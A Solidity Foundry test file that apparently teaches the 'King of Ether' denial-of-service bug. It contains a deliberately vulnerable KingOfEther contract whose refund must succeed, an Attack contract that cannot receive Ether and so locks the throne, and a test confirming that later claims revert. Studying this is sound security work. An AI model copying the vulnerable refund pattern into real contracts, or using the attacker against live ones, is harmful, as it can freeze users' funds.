// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

//denail of servise 

contract DosTest is Test{

    KingOfEther public king;
    Attack public attack;

    constructor(){
        king=new KingOfEther();
        attack=new Attack();

    }

    function testDos()public{
        address alice=vm.addr(1);
        address bob=vm.addr(2);
        vm.deal(alice, 4000);
        vm.deal(bob, 5000);
        vm.startPrank(alice);
        king.claimThrone{value:100}();
        console.log(king.king());
        console.log(king.balance());
        vm.stopPrank();
        vm.startPrank(bob);
        king.claimThrone{value:200}();
        console.log(king.king());
        console.log(king.balance());
        vm.stopPrank();
        attack.attack{value:300}(address(king));
        vm.startPrank(alice);
        vm.expectRevert("Failed to send Ether");
        king.claimThrone{value:400}();

    }


}

contract KingOfEther{
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value>balance,"you can't claim the thron, you are not the king");
        (bool status,)=king.call{value:balance}("");
        require(status,"Failed to send Ether");

        balance=msg.value;
        king=msg.sender;
    }
    
}

contract Attack{
    KingOfEther public target;
    constructor (){
        target=new KingOfEther();
    }
    function attack(address add)external payable{

        KingOfEther(add).claimThrone{value:msg.value}();

    }
}
